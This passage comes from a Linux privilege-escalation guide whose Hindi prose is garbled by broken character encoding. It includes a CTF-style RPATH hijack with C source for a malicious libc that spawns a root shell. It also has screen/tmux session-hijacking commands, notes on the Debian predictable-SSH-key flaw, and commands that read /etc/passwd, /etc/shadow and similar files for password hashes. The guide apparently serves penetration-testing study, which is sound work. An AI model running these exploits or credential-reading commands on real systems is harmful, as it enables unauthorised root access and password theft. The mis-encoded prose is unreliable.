рдХреЙрдкреА рдХрд░рдХреЗ рд▓рд┐рдм рдХреЛ `/var/tmp/flag15/` рдореЗрдВ рдбрд╛рд▓рдиреЗ рд╕реЗ рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЗрд╕ рд╕реНрдерд╛рди рдкрд░ `RPATH` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
рддреЛ `/var/tmp` рдореЗрдВ `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` рдХреЗ рд╕рд╛рде рдПрдХ рджреБрд╖реНрдЯ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдмрдирд╛рдПрдВред
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## рдХреНрд╖рдорддрд╛рдПрдБ

Linux capabilities рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрдкрд▓рдмреНрдз рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдПрдХ рд╕рдмрд╕реЗрдЯ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ**ред рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд░реВрдЯ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЫреЛрдЯреЗ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд** рдХрд░ рджреЗрддрд╛ рд╣реИред рдЗрди рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрдЬ рдХрд╛ рдкреВрд░рд╛ рд╕реЗрдЯ рдХрдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╢реЛрд╖рдг рдХреЗ рдЬреЛрдЦрд┐рдо рдХрдо рд╣реЛрддреЗ рд╣реИрдВред\
Capabilities рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ **рдкрдврд╝реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ, **"рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди"** рдХреЗ рд▓рд┐рдП рдмрд┐рдЯ рдЗрд╕рдХрд╛ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "**cd**" рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**"рдкрдврд╝рдирд╛"** рдмрд┐рдЯ рдЗрд╕рдХрд╛ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реВрдЪреАрдмрджреНрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **"рд▓рд┐рдЦрдирд╛"** рдмрд┐рдЯ рдЗрд╕рдХрд╛ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдирдИ рдлрд╝рд╛рдЗрд▓реЗрдВ** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

## ACLs

рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд╕реВрдЪреА (ACLs) рд╡рд┐рднрд╛рдЬрдиреАрдп рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреНрд╡рд┐рддреАрдп рд╕реНрддрд░ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреА рд╣реИ, рдЬреЛ **рдкрд╛рд░рдВрдкрд░рд┐рдХ ugo/rwx рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддреА рд╣реИ**ред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрд╣реБрдВрдЪ рдкрд░ рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдпрд╛ рдирдХрд╛рд░рдиреЗ рдХреА рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреА рд╣реИред рдпрд╣ рд╕реНрддрд░ рдХреА **рд╡рд┐рд╕реНрддрд╛рд░рдгрддрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рдмрдВрдзрди** рд╣реЛред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг [**рдпрд╣рд╛рдБ**](https://linuxconfig.org/how-to-manage-acls-on-linux) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

**"kali"** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**рд╕рд┐рд╕реНрдЯрдо рд╕реЗ** рд╡рд┐рд╢рд┐рд╖реНрдЯ ACLs рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## рдЦреБрд▓реА рд╢реИрд▓ рд╕рддреНрд░

**рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рд░реВрдЯ**) рдХреЗ рдХреБрдЫ **рд╢реИрд▓ рд╕рддреНрд░** рдХреЛ **рд╣рд╛рдЗрдЬреИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдореЗрдВ рдЖрдк рдХреЗрд╡рд▓ **рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ **рд╕реНрдХреНрд░реАрди рд╕рддреНрд░** рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рдХрд░ рд╕рдХреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рд╕рддреНрд░ рдХреЗ рдЕрдВрджрд░ **рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕реНрдХреНрд░реАрди рд╕рддреНрд░ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

**рд╕реНрдХреНрд░реАрди рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**рдПрдХ рд╕рддреНрд░ рд╕реЗ рдЬреБрдбрд╝реЗрдВ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux рд╕рддреНрд░ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрд╣ **рдкреБрд░рд╛рдиреЗ tmux рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдХреА рд╕рдорд╕реНрдпрд╛ рдереАред рдореИрдВ рдПрдХ рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рдПрдХ tmux (v2.1) рд╕рддреНрд░ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдирд╣реАрдВ рдХрд░ рд╕рдХрд╛ред

**tmux рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**рдПрдХ рд╕рддреНрд░ рдореЗрдВ рдЬреБрдбрд╝реЗрдВ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
рдПрдЪрдЯреАрдмреА рд╕реЗ рд╡реИрд▓реЗрдВрдЯрд╛рдЗрди рдмреЙрдХреНрд╕ рдХреА рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдгред

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

рд╕рднреА SSL рдФрд░ SSH рдХреБрдВрдЬреА рдЬреЛ рджреЗрд╡реАрдпрди рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ (рдЙрдмрдВрдЯреВ, рдХреБрдмрдВрдЯреВ, рдЖрджрд┐) рдкрд░ рд╕рд┐рддрдВрдмрд░ 2006 рд╕реЗ 13 рдордИ, 2008 рдХреЗ рдмреАрдЪ рдЙрддреНрдкрдиреНрди рдХреА рдЧрдИ рд╣реЛрдВ, рдЗрд╕ рдмрдЧ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред\
рдпрд╣ рдмрдЧ рдЙрд╕ рд╕рдордп рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЙрди рдУрдПрд╕ рдореЗрдВ рдПрдХ рдирдИ SSH рдХреБрдВрдЬреА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ **рдХреЗрд╡рд▓ 32,768 рд╡реЗрд░рд┐рдПрд╢рди рд╕рдВрднрд╡ рдереЗ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рднреА рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдФрд░ **рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИ рддреЛ рдЖрдк рдЙрд╕рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЖрдк рдпрд╣рд╛рдБ рдЧрдгрд┐рдд рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рдиреНрдпрд╛рд╕ рдорд╛рди

* **PasswordAuthentication:** рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИ `no`ред
* **PubkeyAuthentication:** рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИ `yes`ред
* **PermitEmptyPasswords**: рдЬрдм рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдЦрд╛рддреЛрдВ рдореЗрдВ рдЦрд╛рд▓реА рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИ `no`ред

### PermitRootLogin

рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд░реВрдЯ SSH рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИ `no`ред рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:

* `yes`: рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `without-password` рдпрд╛ `prohibit-password`: рд░реВрдЯ рдХреЗрд╡рд▓ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╣реА рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `forced-commands-only`: рд░реВрдЯ рдХреЗрд╡рд▓ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ рдпрджрд┐ рдХрдорд╛рдВрдб рд╡рд┐рдХрд▓реНрдк рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ рддреЛ рд╣реА рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `no` : рдирд╣реАрдВ

### AuthorizedKeysFile

рдЙрди рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ `%h` рдЬреИрд╕реЗ рдЯреЛрдХрдиреНрд╕ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдШрд░ рдХреЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред **рдЖрдк рд╕рдЯреАрдХ рдкрдереЛрдВ рдХреА рд╕реВрдЪрдирд╛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬреЛ `/` рд╕реЗ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрддреА рд╣реИрдВ) рдпрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдШрд░ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкрде**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
рд╡рд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрдЧрд╛ рдХрд┐ рдЕрдЧрд░ рдЖрдк "**testusername**" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **рдирд┐рдЬреА** рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рддреЛ ssh рдЖрдкрдХреА рдХреБрдВрдЬреА рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ `/home/testusername/.ssh/authorized_keys` рдФрд░ `/home/testusername/access` рдореЗрдВ рд╕реНрдерд┐рдд рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░реЗрдЧрд╛

### ForwardAgent/AllowAgentForwarding

SSH рдПрдЬреЗрдВрдЯ рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдЖрдкрдХреЛ рдЕрдкрдиреА рд╕реНрдерд╛рдиреАрдп SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХреБрдВрдЬреА (рдкрд╛рд╕рдлреНрд░реЗрдЬрд╝ рдХреЗ рдмрд┐рдирд╛!) рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рдкрд░ рдмреИрдардиреЗ рджреЗрдиреЗ рдХреЗ рдмрдЬрд╛рдпред рдЗрд╕рд▓рд┐рдП, рдЖрдк ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдПрдХ рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЬрдВрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рдкрд░ **рдЬрдВрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╣реЛрд╕реНрдЯ** рдореЗрдВ рд╕реНрдерд┐рдд **рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

рдЖрдкрдХреЛ рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ `$HOME/.ssh.config` рдореЗрдВ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```
Host example.com
ForwardAgent yes
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ `Host` `*` рд╣реИ рддреЛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрди рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рд╣реЛрд╕реНрдЯ рдХреЛ рдХреБрдВрдЬрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА (рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ)ред

рдлрд╝рд╛рдЗрд▓ `/etc/ssh_config` рдЗрд╕ **рд╡рд┐рдХрд▓реНрдк** рдХреЛ **рд░рджреНрдж** рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдЗрд╕ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдпрд╛ рдирдХрд╛рд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИред\
рдлрд╝рд╛рдЗрд▓ `/etc/sshd_config` ssh-agent forwarding рдХреЛ `AllowAgentForwarding` рд╢рдмреНрдж рдХреЗ рд╕рд╛рде **рдЕрдиреБрдорддрд┐** рдпрд╛ **рдирдХрд╛рд░** рд╕рдХрддреА рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЕрдиреБрдорддрд┐ рд╣реИ)ред

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ Forward Agent рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЗрдВ

### рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдлрд╝рд╛рдЗрд▓ `/etc/profile` рдФрд░ `/etc/profile.d/` рдХреЗ рддрд╣рдд рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИрдВ рдЬреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирдП рд╢реИрд▓реА рдЪрд▓рд╛рддрд╛ рд╣реИ рдЬрдм рд╡рд╣ рдПрдХ рдирдИ рд╢реИрд▓реА рдЪрд▓рд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рднреА рдПрдХ рдХреЛ рд▓рд┐рдЦрдиреЗ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
ls -l /etc/profile /etc/profile.d/
```
### рдкрд╛рд╕рд╡рд░реНрдб/рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА рдЕрдЬреАрдм рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЦреЛрдЬрдиреЗ рдкрд░ рдЙрд╕реЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдгреЛрдВ** рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЖрдзрд╛рд░ рдкрд░ `/etc/passwd` рдФрд░ `/etc/shadow` рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдХ рдЕрд▓рдЧ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рдПрдХ рдмреИрдХрдЕрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **рдЖрдк рд╕рднреА рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬреЗрдВ** рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ **рд╣реИрд╢** рд╣реИрдВ:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
рдХрднреА-рдХрднреА рдЖрдк `/etc/passwd` (рдпрд╛ рд╕рдордХрдХреНрд╖) рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп /etc/passwd

